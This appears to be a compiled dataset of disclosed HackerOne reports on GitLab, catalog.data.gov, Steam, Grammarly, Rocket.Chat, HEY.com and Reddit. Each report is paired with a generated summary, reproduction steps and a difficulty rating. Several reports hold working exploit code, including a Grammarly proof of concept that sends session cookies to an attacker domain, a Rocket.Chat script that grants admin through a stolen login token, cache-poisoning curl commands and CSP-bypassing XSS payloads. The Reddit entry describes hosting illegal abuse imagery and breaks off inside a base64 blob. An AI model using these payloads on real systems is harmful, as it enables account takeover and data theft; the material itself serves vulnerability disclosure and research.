3  --header "content-type: application/json" \
4  --header "PRIVATE-TOKEN: AAAAAAAAAAAAAYYYYabc" \
5  --data '{
6    "personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
7    "repo_id": "523303538",
8    "target_namespace": "yvvdwf",
9    "new_name": "xss-on-label-color",
10    "github_hostname": "http://51.75.74.52:80"
11}'
After finishing, you can view the list of the labels of the imported project. You should see an popup created by this js alert(document.domain)
An example is available here (private project): https://gitlab.com/yvvdwf/xss-on-label-color/-/labels
Impact
Stored-XSS with CSP-bypass allows attackers to execute arbitrary actions on behalf of victims at the client side.
Impact
Stored-XSS with CSP-bypass allows attackers to execute arbitrary actions on behalf of victims at the client side.



================================================================================
Vulnerability Description:
GitLab's project import feature from GitHub does not sanitize label colors, allowing stored XSS attacks. By importing a project with malicious label colors, an attacker can execute arbitrary JavaScript in the context of the victim's session, bypassing CSP protections.

Steps to Reproduce:
1. Set up a dummy GitHub server with Node.js that allows arbitrary label colors and host it on a public IP accessible by GitLab.
2. Use a GitLab API token to import a project from the dummy GitHub server, including labels with malicious color values that contain XSS payloads.
3. View the imported project's labels in GitLab to trigger the XSS payload, which bypasses CSP protections.
Exploitation Difficulty:
The vulnerability requires setting up a custom GitHub server to bypass GitHub's label color restrictions, understanding GitLab's project import API, and crafting a payload that bypasses CSP. The interaction between these components is non-obvious and requires knowledge of both systems.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1693150: Bypass: Stored-XSS with CSP-bypass via scoped labels' color
================================================================================
RAW DESCRIPTION:

Hi team,
The Stored-XSS with CSP-bypass via labels' color has been mitigated in Gitlab 15.3.2. However it is not enough because it missed the case of scoped label.
I notified this missing in the original report and @galfaro encouraged me to submit a new report about this.
Step to reproduce:
To reproduce, we need the following prerequisites:
Scoped labels are available in Gitlab Premium, so we need a premium account that can be obtained via the free trial
A Gitlab personal access token. Go here to create a new token with within api scope.
Scoped labels are available in Gitlab Premium, so we need a premium account that can be obtained via the free trial
A Gitlab personal access token. Go here to create a new token with within api scope.
Github does not allow to create arbitrary label colors. You can find in the attachment a dummy Github server in which we set a new label:
name: yvvdwf::label-name (the :: to scope the label)
color: ">yvvdwf-label<form class='hidden gl-show-field-errors'><input title='<script>alert(document.domain)</script>'>
name: yvvdwf::label-name (the :: to scope the label)
color: ">yvvdwf-label<form class='hidden gl-show-field-errors'><input title='<script>alert(document.domain)</script>'>
To easily reproduce, I'm hosting the dummy Github server at my own VPS, http://51.75.74.52:11211, I will shut it down once you validated the report.
Open a new terminal, then run the following command, in which:
$GL_TOKEN is the the api token you've created above
yvvdwf-group-a is a group (or account) name having premium features
$GL_TOKEN is the the api token you've created above
yvvdwf-group-a is a group (or account) name having premium features
For example:
Code 403 Bytes
1curl -kv "https://gitlab.com/api/v4/import/github" \
2  --request POST \
3  --header "content-type: application/json" \
4  --header "PRIVATE-TOKEN: $GL_TOKEN" \
5  --data '{
6    "personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
7    "repo_id": "523303538",
8    "target_namespace": "yvvdwf-group-a",
9    "new_name": "xss-on-label-color",
10    "github_hostname": "http://51.75.74.52:11211"
11}'
After finishing, you can view the list of the label of the imported project. You should see a popup created by this javascript alert(document.domain)
Since we can control the label color, we can create a Stored-XSS with CSP-bypass on another place rather than the page that lists the labels, such as, an issue or a merged request of another project by using GitLab-specific references
Example:
https://gitlab.com/yvvdwf-group-a/xss-on-label-color/-/labels
https://gitlab.com/yvvdwf-group-a/xss-on-label-color/-/issues/1
Output of checks
This bug happens on GitLab.com
Impact
Stored-XSS with CSP-bypass allows attackers to execute arbitrary actions on behalf of victims at the client side.
Beside that, I would like to clarify some other metrics in the CVSS (the text in bold is copied from your cvss calculator )
AC:L: Stored XSS on a page that's part of the user's normal workflow (issue or merge request page): As I mentioned above the store-XSS is on the issue/MR requests of a project the attack may create an issue/MR
PR:N: The attacker is logged out - PR:N - but the victim is logged in: The stored-XSS still exist even the attacker is logged out.
C:H: Access tokens, runner tokens. Private repositories: Indeed the XSS allows to execute any Rest API on behalf of the victim to get almost arbitrary private information of the victim (unless his password). It can even perform a fake account-take-over by changing the victim's username and immediately register a new account within the victim's username (as changing username does not require to confirm password)
A:L: This Store-XSS with CSP-bypass can easily create DoS at the client side by exhausting CPU and RAM of the victim's Web browser. It can also be used to send as much as possible the requests to the server. The number of requests can increase by the number of victims who are viewing the XSS.
Best regards,
Impact
Stored-XSS with CSP-bypass allows attackers to execute arbitrary actions on behalf of victims at the client side.



================================================================================
Vulnerability Description:
A stored Cross-Site Scripting (XSS) vulnerability exists in GitLab's handling of scoped label colors during GitHub imports, allowing attackers to bypass Content Security Policy (CSP) and execute arbitrary JavaScript in the context of the victim's session. The vulnerability stems from insufficient sanitization of label color values in scoped labels, which were not fully addressed in the initial fix for regular labels.

Steps to Reproduce:
1. Create a premium GitLab account with scoped labels enabled and obtain a personal access token with API scope.
2. Use a modified GitHub server to create a label with a malicious color value containing XSS payload in the format: '>yvvdwf-label<form class="hidden gl-show-field-errors"><input title="<script>alert(document.domain)</script>'>'
3. Import the malicious label into GitLab using the API with a curl command that specifies the GitHub server URL, target namespace, and the malicious label details.
4. Trigger the XSS by viewing the imported label in GitLab's interface, which executes the JavaScript payload due to improper sanitization of the label color field.
Exploitation Difficulty:
The vulnerability requires understanding of multiple components: GitLab's label system, GitHub import functionality, CSP bypass techniques, and scoped label handling. The attacker must chain these components together in a non-obvious way, including setting up a custom GitHub server with malicious payloads and understanding how GitLab processes imported labels. The interaction between scoped labels and the import functionality is particularly subtle.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/303730: Defacement of catalog.data.gov via web cache poisoning to stored DOMXSS
================================================================================
RAW DESCRIPTION:

An attacker can deface various pages on catalog.data.gov, leading to them executing malicious JavaScript when visited by a normal user.
The root problem is that the server trusts the X-Forwarded-Host HTTP header, and uses this to populate the 'data-site-root' and 'data-locale-root' attributes on the <body tag. Some JavaScript then fetches a JSON file from the URL specified in these attributes, and writes the response to the page without escaping it, leading to a DOMXSS vulnerability.
This behaviour is harmless by itself, since I can't make a victim send a malicious HTTP header. Fortunately for me, I can ensure that the poisoned response sent to me is cached by CloudFront, meaning my payload will be served to loads of other users.
Please be careful when exploring this issue, as it's potentially quite easy to accidentally poison CloudFront's cache and antagonise your visitors. To safely replicate this issue, you can use the following steps:
Run curl command to poison cache:
curl -i -s -k -X $'GET' \
-H $'Host: catalog.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: /' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H $'Connection: close' \
$'https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6' > /dev/null
Visit the poisoned page:
https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6
Wait for a few seconds, and observe the popup caused by our injected alert(document.domain)
Behind the scenes, step 1 poisons the cache with a data-site-root value of 'portswigger-labs.net/catalog.data.gov_json_xss/json.php'. In step 2, some JavaScript fetches our json.php file from portswigger-labs.net, and uses our 'show more' JSON attribute to translate the 'show more' text on https://catalog.data.gov/dataset/consumer-complaint-database into "Mostrar más <svg onload=alert(document.domain)>"
This is the offending line of JavaScript:
var template_more = ['<tr class="toggle-show toggle-show-more">', '<td colspan="' + cols + '">', '<small>', '<a href="#" class="show-more">' + this.i18n('show_more') + '</a>', '<a href="#" class="show-less">' + this.i18n('show_less') + '</a>', '</small>', '</td>', '</tr>'].join('\n');
To mitigate this issue, I recommend addressing the X-Forwarded-Host reflection.
Please let me know if you have any questions.
Cheers,
James & Gareth
Impact
An attacker can deface most pages on catalog.data.gov.



================================================================================
Vulnerability Description:
An attacker can deface various pages on catalog.data.gov by poisoning the web cache to execute malicious JavaScript when visited by normal users. The server trusts the X-Forwarded-Host HTTP header, which is used to populate attributes on the <body> tag. JavaScript then fetches a JSON file from the URL specified in these attributes and writes the response to the page without escaping it, leading to a DOMXSS vulnerability.

Steps to Reproduce:
1. Run curl command to poison cache: curl -i -s -k -X $'GET' -H $'Host: catalog.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: /' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H $'Connection: close' $'https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6' > /dev/null
2. Visit the poisoned page: https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6 and observe the popup caused by the injected alert(document.domain)
Exploitation Difficulty:
The attack involves multiple components (HTTP header manipulation, cache poisoning, DOMXSS) and requires understanding subtle interactions between them. The attacker must also be aware of how the server processes the X-Forwarded-Host header and how the JavaScript uses the injected data.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/409850: XSS in steam react chat client
================================================================================
RAW DESCRIPTION:

The Steam chat client both sends and receives bbcode format chat messages. These map to HTML elements, and notably the [url] bbcode tag is supported for arbitrary URLs. React has strong XSS mitigations but does not mitigate javascript: URI based XSS.
This is rather difficult to exploit as the client transmits sanitised messages and receives over a binary WebSocket. I've attached a video of executing this XSS, which is persistent.
Impact
I strongly believe an attacker could get remote code execution in Steam via this method. The Steam chat client uses the same codebase as the steam web chat client, and, I imagine does so using electron or some other webview system. These systems all expose functions which allow arbitrary calls to system to allow them to be competitive with e.g. windows forms.



================================================================================
Vulnerability Description:
The vulnerability is an XSS in the Steam chat client that leverages BBCode's [url] tag to execute javascript: URIs, bypassing React's XSS mitigations. This could potentially lead to remote code execution due to the client's use of Electron or a similar webview system that exposes system functions.

Steps to Reproduce:
1. Identify that the Steam chat client uses BBCode for formatting messages, including the [url] tag which can contain arbitrary URLs.
2. Craft a malicious BBCode message with a javascript: URI in the [url] tag to exploit React's lack of mitigation for javascript: URI based XSS.
3. Send the crafted message through the Steam chat client, which transmits sanitized messages over a binary WebSocket.
4. Observe the execution of the XSS payload in the recipient's chat client, which is persistent and could lead to remote code execution.
Exploitation Difficulty:
The attack involves understanding the interaction between BBCode parsing, React's XSS mitigations, and the WebSocket transmission protocol. It also requires knowledge of how Electron or webview systems expose system functions, making it a multi-component attack with subtle interactions.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/534450: Account takeover through the combination of cookie manipulation and XSS
================================================================================
RAW DESCRIPTION:

Summary: A cookie based XSS on www.grammarly.com exists due to reflection of a cookie called gnar_containerId in DOM without any sanitization. Normally, gnar_containerId is being set by the server however a vulnerable endpoint at gnar.grammarly.com called "/cookies" allows us to manipulate cookies set for *.grammarly.com and gnar_containerId was one of them. Through the combination of these findings, we were able to bypass "CORS protection/HttpOnly cookie flag" and steal any Grammarly users cookie that visits a webpage that has our malicious javacript code.
Description: An endpoint at gnar.grammarly.com called "/cookies" allows us to set or get any cookie value we want. Sending a POST request sets the cookie value whereas sending a GET cookie returns the value of an existing cookie. In a normal scenario, an attacker could send a GET request to that enpoint and read user authentication cookie (grauth in this case)But due to the same origin policy, we were not able to read the response . Sending a POST request was still viable(as we did not have to read the response) and we were able to replace session cookies of users (who had browsed any webpage that contained our malicious javascript) and force them to use our session. This allowed us to see any document that was created after the point of exploitation.
This was our initial bug bounty report (#532553) however, HackerOne staff did not approve it and said this is how cookies are supposed to work. So we decided to investigate this case further.
Then we have found that Grammarly uses multiple cookies and one of them is called "gnar_containerId". We have discovered that this cookie gets reflected on the "www.grammarly.com" in src attribute of an img tag. The value inside the img tag is encoded and not exploitable. However there is another img tag, surrounded with noscript tags. The second value that is inside of the noscript tags was not encoded and prone to XSS. Combining the XSS vulnerability found in the www.grammarly.com domain and the cookie manipulation through gnar.grammarly.com/cookies allowed us to inject a gnar_containerId cookie that holds our malicious javascript code
Our malicious payload that was injected into the context of grammarly.com will make a get request to gnar.grammarly.com/cookies to retrieve the values of the session cookies of the currently logged in user and send it back to our server. Normally, an ordinary XSS would not lead to such cases as grammarly cookies are set to be httponly and secure, so it is not possible to manipulate cookies through DOM. But Thanks to the endpoint that we have discovered initially, we were able to retrieve/replace any cookies that was set by *.grammarly.com. We were able to bypass the CORS as our requests were sent on behalf of the grammarly.com and read the response.
To put it simply, if a user visits a webpage that we control, it will steal the cookies and send them to us. Our payload will make a post request to gnar.grammarly.com/cookies to replace the gnar_containerid with the second stage of our payload and the redirect the user to the vulnerable page. Upon this, our injected payload will get triggered and will make another request to gnar.grammarly.com/cookies on behalf of the grammarly.com, then will send the response body to a server that we control.
For the purpose of illustration, we just stole grauth cookie of a test account but we could actually steal any cookie set by grammarly.com.
Solution: This attack scenario was made possible because of the following:
gnar.grammarly.com/cookies does not check Referer information when it receives POST request. Adding a Referer check (assuming that no website other than the ones that hosted at *.grammarly.com is using that endpoint) will prevent client-side requests from 3rd parties.
There is no whitelist/blacklist for cookies that a client can alter. Disallowing the alteration of grauth and csrf-token cookies should be implemented.
Content based encoding was applied for noscript tags however with the combination of unnecessary trust to the cookies, an XSS was possible. Encoding should be applied for noscript tags too.
Browsers Verified In:
Google Chrome 73.0.3683.86 (Official Build) (64-bit)
Mozilla Firefox 60.6.1esr (64-bit)
Steps To Reproduce:
Host a webpage that is being served over HTTPS (to circumvent Mixed-Content protection)
Serve the HTML snipped below on the said page (called "Grammarly.html" for example):
Code 904 Bytes
1<html>
2
3<head>
4<title>Grammarly POC</title>
5<meta charset="utf-8"/>
6<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
7</head>
8
9<body>
10<script>
11
12    var cookie_hax = {
13        "gnar_containerId":"</noscript><script/src='https://<YOUR_DOMAIN_NAME>/poc.js'></scr"+"ipt><noscript>",
14    };
15
16    for (var name in cookie_hax) {
17        $.ajax({
18            type: "POST",
19            url: "https://gnar.grammarly.com/cookies?name=" + name + "&value=" + encodeURIComponent(cookie_hax[name]) + "&maxAge=2147483647",
20            cache: false,
21            xhrFields: {
22                withCredentials: true
23            },
24            crossDomain: true,
25            async: false,
26        });
27    }
28
29    window.location.replace("https://www.grammarly.com/upgrade?utm_source=upHook&app_type=app&page=free&utm_campaign=editorMenu&utm_medium=internal");
30
31</script>
32</body>
33
34</html>
Serve the javascript code below on the same webserver (called "poc.js" for example):
Code 254 Bytes
1var xhr = new XMLHttpRequest();
2xhr.open('GET', "https://gnar.grammarly.com/cookies?name=grauth");
3xhr.withCredentials = true;
4xhr.onload = function () {
5    this.open('GET', "https://<YOUR_DOMAIN_NAME>/" + this.response);
6    this.send();
7};
8xhr.send();
Browse the Grammarly.html and watch the webserver access logs (to extract cookie value)
Supporting Material/References:
Webserver access logs:
Code 474 Bytes
1178.251.40.58 - - [10/Apr/2019:13:23:04 +0000] "GET /poc.js HTTP/1.1" 200 736 "https://www.grammarly.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
2178.251.40.58 - - [10/Apr/2019:13:23:05 +0000] "GET /?cookie={██████████} HTTP/1.1" 200 3466 "https://www.grammarly.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
Impact
Account takeover via cookie stealing



================================================================================
Vulnerability Description:
A combination of cookie manipulation via a vulnerable endpoint and DOM-based XSS allows an attacker to steal session cookies, leading to account takeover. The attack bypasses HttpOnly and CORS protections by leveraging a server endpoint that improperly allows cookie manipulation.

Steps to Reproduce:
1. Host a webpage with malicious JavaScript that manipulates the gnar_containerId cookie via the gnar.grammarly.com/cookies endpoint.
2. Redirect the user to a vulnerable page on www.grammarly.com where the malicious cookie is reflected in an unencoded noscript tag, triggering XSS.
3. The XSS payload retrieves the user's session cookies via the same gnar.grammarly.com/cookies endpoint and sends them to an attacker-controlled server.
Exploitation Difficulty:
This vulnerability involves multiple complex components: discovering the cookie manipulation endpoint, identifying the XSS vector in the noscript tag, and crafting a payload that combines these to bypass security controls. The interaction between the cookie manipulation and XSS is non-obvious and requires deep understanding of both mechanisms.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/735638: Account takeover via XSS
================================================================================
RAW DESCRIPTION:

Summary: By combining AutoLinker and Markdown an attacker is able to inject malicious scripts.
Description: By combining AutoLinker and Markdown we can trick the parser into breaking out of the current HTML attribute.
Code 229 Bytes
1https://a?p=[ ](https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'alert\x28\x27XSS\x27\x29;'instanceof[] target=_blank data-x=`.`)
results in:
Code 494 Bytes
1<a href="https://a?p=<a href=" https:="" style="animation-duration:1s;animation-name:blink;animation-iteration-count:2" onanimationiteration="Array.prototype[Symbol.hasInstance]=eval,'alert\x28\x27XSS\x27\x29;'instanceof[]" target="_blank" data-x="<span" class="copyonly">`<span><code class="code-colors inline">.</code></span><span class="copyonly">`</span>" target="_blank" rel="noopener noreferrer"&gt; </a>
2" target="_blank" rel="noopener noreferrer"&gt;https://a?p==!=7vrXTtDtYHrLJ4Z7y=!="
To obtain the login-token of the victim we can either use document.cookie or localStorage.getItem('Meteor.loginToken').
Since we can authenticate against the websocket using this token, we can perform any actions in the context of the victim (change password, email etc.).
Releases Affected:
Rocket.Chat-Desktop-Client: v2.16.2
Rocket.Chat-Server: v2.0.0
Apps-Engine-Version: v1.5.2
Steps To Reproduce (from initial installation to vulnerability):
In this example, the role admin is assigned to the desired user as far as the victim has the required permissions.
Code (replace {ATTACKER_USERID} and {ATTACKER_EMAIL}):
Code 1.11 KiB
1    let ws = new WebSocket(`wss://${window.location.host}/sockjs/111/evilwss/websocket`);
2    ws.onmessage = function (evt) {
3        if (/\["{\\"msg\\":\\"pong\\"}"\]/.test(event.data)) {
4            ws.send('["{\\"msg\\":\\"pong\\"}"]');
5        }
6        if (/a\["{\\"server_id\\":\\"(.*)\\"}"\]/.test(event.data)) {
7            ws.send('["{\\"msg\\":\\"connect\\",\\"version\\":\\"1\\",\\"support\\":[\\"1\\",\\"pre2\\",\\"pre1\\"]}"]');
8            ws.send(`["{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"resume\\":\\"${localStorage.getItem('Meteor.loginToken')}\\"}],\\"id\\":\\"1\\"}"]`);
9        }
10        if (/a\["{\\"msg\\":\\"connected\\",\\"session\\":\\"(.*)\\"}"\]/.test(event.data)) {
11            ws.send('["{\\"msg\\":\\"method\\",\\"method\\":\\"insertOrUpdateUser\\",\\"params\\":[{\\"_id\\":\\"{ATTACKER_USERID}\\",\\"statusText\\":\\"\\",\\"email\\":\\"{ATTACKER_EMAIL}\\",\\"verified\\":false,\\"password\\":\\"\\",\\"requirePasswordChange\\":false,\\"joinDefaultChannels\\":false,\\"sendWelcomeEmail\\":false,\\"roles\\":[\\"user\\",\\"admin\\"]}],\\"id\\":\\"17\\"}"]');
12        }
13    };
Payload (replace sectex.dev\x2ffiles\x2fcswsh.js):
Code 364 Bytes
1https://a?p=[ ](https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'s=document.createElement\x28\x27script\x27\x29;s.src=\x27\x68\x74\x74\x70\x73\x3a\x2f\x2fsectex.dev\x2ffiles\x2fcswsh.js\x27;document.body.appendChild\x28s\x29;'instanceof[] target=_blank data-x=`.`)
Supporting Material/References:
Suggested mitigation
Fix initial XSS
Impact
Attackers can execute scripts which can lead to:
Account takeover
Abitrary file read in Rocket.Chat-Desktop
RCE in Rocket.Chat-Desktop (#276031)
Account takeover
Abitrary file read in Rocket.Chat-Desktop
RCE in Rocket.Chat-Desktop (#276031)



================================================================================
Vulnerability Description:
This vulnerability allows an attacker to perform an account takeover via XSS by injecting malicious scripts through a combination of AutoLinker and Markdown. The attacker can steal the victim's login token and authenticate against the websocket to perform actions as the victim.

Steps to Reproduce:
1. Inject a malicious XSS payload by combining AutoLinker and Markdown to break out of the HTML attribute context.
2. Use the injected script to steal the victim's login token via document.cookie or localStorage.getItem('Meteor.loginToken').
3. Authenticate against the websocket using the stolen token to perform actions in the victim's context (e.g., change password, email, etc.).
Exploitation Difficulty:
The attack involves multiple components (XSS injection, token theft, websocket authentication) and requires understanding subtle interactions between AutoLinker and Markdown parsing. Additionally, the attack manipulates complex application states (websocket sessions) and uses novel logic (animation events for script execution).

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/982291: HEY.com email stored XSS
================================================================================
RAW DESCRIPTION:

An attacker can bypass the HEY.com HTML sanitizer and inject arbitrary unsafe HTML in emails.
To reproduce the bug you have to send raw HTML-formatted email. You can do it e.g. with the Sendmail tool on Linux.
Example email:
Code 547 Bytes
1From: jouko@klikki.fi
2To: jouko@hey.com
3Subject: HackerOne test
4MIME-Version: 1.0
5Content-type: text/html
6
7<style>
8url(cid://\00003c\000027message-content\00003e\00003ctemplate\00003e\00003cstyle\00003exxx);
9url(cid://\00003c/style\00003e\00003c/template\00003e\00003c/message-content\00003e\00003cform\000020action=/my/accounts/266986/forwardings/outbounds\000020data-controller=beacon\00003e\00003cinput\000020type=text\000020name=contact_outbound_forwarding[to_email_address]\000020value=joukop@gmail.com\00003e\00003c/form\00003exxx);
10</style>
To send the email, create a text file with the above contents. Send it with the command
Code 33 Bytes
1/usr/sbin/sendmail -t < email.txt
The backslashes in the <style> tag are decoded. The first \000027 confuses the HTML filter. The encoded <message-content> and <template> tags are there to escape the DOM shadowroot element. The HTML filter doesn't let you inject only closing tags, i.e. </template>, you need an opening tag first.
Finally, HTML like this is injected:
Code 185 Bytes
1<form action="/my/accounts/266986/forwardings/outbound" data-controller="beacon">
2<input type=text name="contact_outbound_forwarding[to_email_address]" value="joukop@gmail.com">
3</form>
This exploits the Stimulus framework and the existing JavaScript controllers to post the form automatically. The CSRF token is inserted by the framework. This example sets up email forwarding to an external address.
This is just one way to exploit the bug. Even though plain <script> won't work in modern browsers due to the Content Security Policy, It seems likely there are ways to bypass it by using the JS frameworks (will look at this more). The account ID in this PoC has to be guesstimated or brute forced (266986).
Another example is to simply set the form action to an attacker URL. This will send the user's CSRF token to the attacker so that it could be used in a subsequent attack.
<image_0>
If you want to view the email on my HEY account (jouko@hey.com) the email ID is 83625339.
Impact
A HEY user viewing an email sent by the attacker may have their account compromised.



================================================================================
Vulnerability Description:
An attacker can bypass HEY.com's HTML sanitizer to inject arbitrary unsafe HTML in emails, leading to stored XSS. This can be exploited to perform actions like setting up email forwarding to an external address or stealing CSRF tokens.

Steps to Reproduce:
1. Create a text file with the email content including the malicious HTML and CSS.
2. Send the email using the sendmail command: `/usr/sbin/sendmail -t < email.txt`.
3. The recipient views the email in HEY.com, triggering the XSS payload.
Exploitation Difficulty:
The attack involves bypassing HTML sanitization through non-obvious encoding techniques, leveraging shadow DOM elements, and exploiting existing JavaScript controllers. It requires understanding of HTML/CSS encoding, DOM manipulation, and the application's JavaScript framework.

--------------------------------------------------------------------------------



Remote File Inclusion Vulnerabilities (1 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1719588: HTML injection in API response including request url
================================================================================
RAW DESCRIPTION:

Hi Reddit ,
I found a way to distribute, persist & store Illegal images such as child porn , beheadings on reddit and in plain sight .
I can also store & distribute xml ,json data eg illegal links .
I can also store & communicate illegal instructions aka terrorist messages in html and plain text.
This hack also bypasses all security related to detecting illegal messages & pictures on reddit
Impact:
Many possible impacts :
Criminals could trade child porn ,beheading and other illegal images on reddit without detection .
Criminals & Terrorist groups could distribute illegal bombing & attack messages

Criminals could store JavaScript code

User will not be presented with Warning that you are navigating away from Reddit.com
Criminals could pretend to be Legitimate Reddit employees and trick reddit users into navigating to & executing the code simply by right click Go to in there browser as a result Criminals could exploit reddit users & steal there cookies and infect them with viruses etc once they execute the stored code .
All of the above would by pass Reedits automated systems .
To execute this proof of concepts please Login to reddit as a user than navigate to the url.
There are 3 classes
1) Storage , Persistence by criminals
2) Retrieval , By criminals
3)Executions -involuntary by unsuspecting reddit users.
The data retrieval can be voluntary eg criminal networks doing scheduled drop offs and pick ups , or hackers deliberately persisting malicious code that infects or spies on involuntary curious users landing form hrefs and following instructions but instead getting pawned due to executing the JavaScript.
PROOF OF Distributing child porn
You will see BART SIMPSON image as an example but its clear that he API isn't going to run any sort of Image recognition validation or neural net on this API input. The below demonstrates misusing the reditt.com api to store illegal images
It also demonstrates criminals can than access and trade illegal like child porn images in plain site on reddit.
Code 7.47 KiB
1<code>
2https://s.reddit.com/REDIT.EXPERIMENTAL.FEATURE:Hi.user.You.know.we.got.the.stuff.right.click.and.go.on.data..........data:image/jpeg;base64,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